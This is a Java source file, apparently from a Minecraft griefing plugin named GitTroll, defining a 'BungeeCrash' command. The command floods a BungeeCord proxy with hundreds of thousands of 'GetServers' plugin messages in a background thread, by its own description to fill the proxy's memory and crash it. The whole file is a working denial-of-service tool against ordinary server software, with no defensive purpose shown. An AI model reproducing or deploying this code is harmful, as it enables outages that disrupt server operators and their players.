package net.Lenni0451.GitTroll.command.commands.bungeecord;

import java.util.List;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.BungeeUtils;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class BungeeCrash extends CommandBase {

	public BungeeCrash() {
		super("BungeeCrash", "Fill the memory of the bungee until a memory leak occurs", "[Loop count]");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			this.execute(executor, new ArrayHelper(args.advanceToStrings("500000")));
		} else if(args.isLength(1) && args.isInteger(0)) {
			new Thread(() -> {
				executor.sendGitMessage("The bungee crash has been started.");
				
				BungeeUtils bu = new BungeeUtils(executor.getPlayer());
				for(int i = 0; i < args.getInteger(0); i++) {
					bu.sendBungeeMessageToPlayer("GetServers");
				}
				
				executor.sendGitMessage("The bungee crash has been finished.");
			}).start();
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
